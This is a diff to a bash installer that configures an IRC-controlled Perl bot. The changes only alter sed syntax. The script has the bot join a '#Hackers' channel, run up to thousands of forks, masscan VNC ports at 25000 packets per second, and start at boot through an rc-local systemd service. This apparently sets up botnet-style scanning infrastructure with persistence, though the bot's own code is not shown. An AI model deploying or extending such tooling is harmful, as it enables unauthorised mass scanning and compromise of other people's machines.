@@ -45,31 +45,31 @@ read -p "Proceed to bot configurations? Y or LEAVE BLANK + ENTER" choice
 case $choice in
  Y)  
 if read -p "IRC server:port? " name; then
- sed -i~ -e "s/#defineserverhere/server => \'${name}\',/g" perlircssl.pl
+ sed --in-place "s/#defineserverhere/server => \'${name}\',/g" "perlircssl.pl"
 fi
 read -p "Is the IRC port listening over SSL encryption? < 1 / 0 > (1=Yes, 0=No)" ssl
 case $ssl in
- 0) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => ${ssl}});/g" perlircssl.pl;;
-*) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => 1});/g" perlircssl.pl;;
+ 0) sed --in-place "s/#definesslhere/\$irc->tls({insecure => ${ssl}});/g" "perlircssl.pl";;
+*) sed --in-place "s/#definesslhere/\$irc->tls({insecure => 1});/g" "perlircssl.pl";;
 esac
 if read -p "Bot Nickname Base? (Bawt)" nick; then
- sed -i~ -e "s/#definenickhere/nick => \'$nick\'.int(rand(99999)),/g" perlircssl.pl
+ sed --in-place "s/#definenickhere/nick => \'$nick\'.int(rand(99999)),/g" "perlircssl.pl"
 fi
 if read -p "Channel to join when connected? (#Hackers)" ch4n; then
- sed -i~ -e "s/#definechanhere/my \$channel = \'$ch4n\';/g" perlircssl.pl
- sed -i~ -e "s/#definenoticechanhere/my \$noticechan = \'@$ch4n\';/g" perlircssl.pl
+ sed --in-place "s/#definechanhere/my \$channel = \'$ch4n\';/g" "perlircssl.pl"
+ sed --in-place "s/#definenoticechanhere/my \$noticechan = \'@$ch4n\';/g" "perlircssl.pl"
 fi
 if read -p "Fork timeout in seconds? (Recommended: 10-60)" timeout; then
- sed -i~ -e "s/#definetimeouthere/my \$forktimeout = "$timeout";/g" perlircssl.pl
+ sed --in-place "s/#definetimeouthere/my \$forktimeout = "$timeout";/g" "perlircssl.pl"
 fi
 if read -p "Maximum number of forks? (Recommended: 50-2000)" m4xfork; then
- sed -i~ -e "s/#defineforkshere/my \$maxforks = "$m4xfork";/g" perlircssl.pl
+ sed --in-place "s/#defineforkshere/my \$maxforks = "$m4xfork";/g" "perlircssl.pl"
 fi
 if read -p "Define the ports numbers to scan (Recommended:5900 (You can add as many port you want, separated by a space))" ports; then
- sed -i~ -e "s|#defineportshere|my @VNC_PORTS = qw/\'$ports\'/;|g" perlircssl.pl
+ sed --in-place "s|#defineportshere|my @VNC_PORTS = qw/\'$ports\'/;|g" "perlircssl.pl"
 fi
 if read -p "Masscan RATE-LIMIT/Recommended: 25000" mrate; then
- sed -i~ -e "s|--rate 25000|--rate "$mrate"|g" perlircssl.pl
+ sed --in-place "s|--rate 25000|--rate "$mrate"|g" "perlircssl.pl"
 fi
 sudo mv rc-local.service /etc/systemd/system/rc-local.service;
 sudo systemctl enable rc-local;
